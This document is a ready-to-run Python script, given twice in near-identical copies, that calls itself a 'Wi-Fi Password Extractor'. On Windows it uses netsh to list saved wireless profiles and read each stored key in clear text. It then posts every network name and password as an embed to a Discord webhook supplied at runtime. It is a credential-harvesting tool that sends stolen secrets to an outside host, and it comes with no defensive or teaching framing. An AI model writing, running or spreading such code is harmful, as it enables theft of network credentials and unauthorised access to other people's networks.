import subprocess
import os
import requests
import discord
from discord import Embed

DISCORD_WEBHOOK_URL = input("Webhooks :")

def send_to_discord(embed):
    try:
        payload = {
            "embeds": [embed.to_dict()]
        }
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if response.status_code != 204:
            print(f"Failed to send to Discord: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

def get_wifi_profiles():
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        return profiles
    except subprocess.CalledProcessError as e:
        print(f"Error getting WiFi profiles: {e}")
        return []

def get_wifi_password(profile_name):
    try:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile_name, 'key=clear']).decode('utf-8', errors='ignore').split('\n')
        password_lines = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        return password_lines[0] if password_lines else None
    except subprocess.CalledProcessError:
        return "ENCODING ERROR"

def print_wifi_info(profiles):
    print('\n' + '='*50)
    print("\033[33m{:<25} || {:<20}\033[0m".format("Wi-Fi Name", "Password"))
    print('='*50)
    
    for profile in profiles:
        password = get_wifi_password(profile)
        
        if password == "ENCODING ERROR":
            print("\033[94m{:<25}\033[0m || \033[91m{:<20}\033[0m".format(profile, "ENCODING ERROR"))
            color = discord.Color.orange()
            description = "Password: ENCODING ERROR"
        elif password is None:
            print("\033[94m{:<25}\033[0m || \033[91m{:<20}\033[0m".format(profile, "None"))
            color = discord.Color.red()
            description = "Password: None"
        else:
            print("\033[94m{:<25}\033[0m || \033[92m{:<20}\033[0m".format(profile, password))
            color = discord.Color.green()
            description = f"Password: {password}"
        embed = Embed(title=f"Wi-Fi Profile: {profile}", description=description, color=color)
        send_to_discord(embed)
    
    print('='*50 + '\n')

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('title Credit : COMK109')
    print('='*50)
    print("\033[33mWi-Fi Password Extractor\033[0m".center(50))
    print('='*50)
    
    profiles = get_wifi_profiles()
    
    if not profiles:
        print("\033[91mNo WiFi profiles found!\033[0m")
        input("\nPress Enter to close program >")
        return
    print_wifi_info(profiles)
    
    print(f"\033[92mTotal WiFi profiles found: {len(profiles)}\033[0m")
    print(f"\033[92mResults sent to Discord webhook\033[0m")
    print('\n')
    input("Press Enter to close program >")

if __name__ == "__main__":
    if os.name == 'nt':
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                print("\033[91mWarning: Not running as administrator!")
                print("Some WiFi passwords might not be accessible.\033[0m\n")
        except:
            pass
    
    main()
import subprocess
import os
import requests
import discord
from discord import Embed

DISCORD_WEBHOOK_URL = input("Webhooks : ")

def send_to_discord(embed):
    try:
        payload = {
            "embeds": [embed.to_dict()]
        }
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if response.status_code != 204:
            print(f"Failed to send to Discord: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

def get_wifi_profiles():
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        return profiles
    except subprocess.CalledProcessError as e:
        print(f"Error getting WiFi profiles: {e}")
        return []

def get_wifi_password(profile_name):
    try:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile_name, 'key=clear']).decode('utf-8', errors='ignore').split('\n')
        password_lines = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        return password_lines[0] if password_lines else None
    except subprocess.CalledProcessError:
        return "ENCODING ERROR"

def print_wifi_info(profiles):
    print('\n' + '='*50)
    print("\033[33m{:<25} || {:<20}\033[0m".format("Wi-Fi Name", "Password"))
    print('='*50)
    
    for profile in profiles:
        password = get_wifi_password(profile)
        
        if password == "ENCODING ERROR":
            print("\033[94m{:<25}\033[0m || \033[91m{:<20}\033[0m".format(profile, "ENCODING ERROR"))
            color = discord.Color.orange()
            description = "Password: ENCODING ERROR"
        elif password is None:
            print("\033[94m{:<25}\033[0m || \033[91m{:<20}\033[0m".format(profile, "None"))
            color = discord.Color.red()
            description = "Password: None"
        else:
            print("\033[94m{:<25}\033[0m || \033[92m{:<20}\033[0m".format(profile, password))
            color = discord.Color.green()
            description = f"Password: {password}"
        
       
        embed = Embed(title=f"Wi-Fi Profile: {profile}", description=description, color=color)
        send_to_discord(embed)
    
    print('='*50 + '\n')

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('title Credit : COMK109')
    print('='*50)
    print("\033[33mWi-Fi Password Extractor\033[0m".center(50))
    print('='*50)
    
    profiles = get_wifi_profiles()
    
    if not profiles:
        print("\033[91mNo WiFi profiles found!\033[0m")
        input("\nPress Enter to close program >")
        return
    
    print_wifi_info(profiles)
    
    print(f"\033[92mTotal WiFi profiles found: {len(profiles)}\033[0m")
    print(f"\033[92mResults sent to Discord webhook\033[0m")
    print('\n')
    input("Press Enter to close program >")

if __name__ == "__main__":
    
    if os.name == 'nt':
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                print("\033[91mWarning: Not running as administrator!")
                print("Some WiFi passwords might not be accessible.\033[0m\n")
        except:
            pass
    
    main()
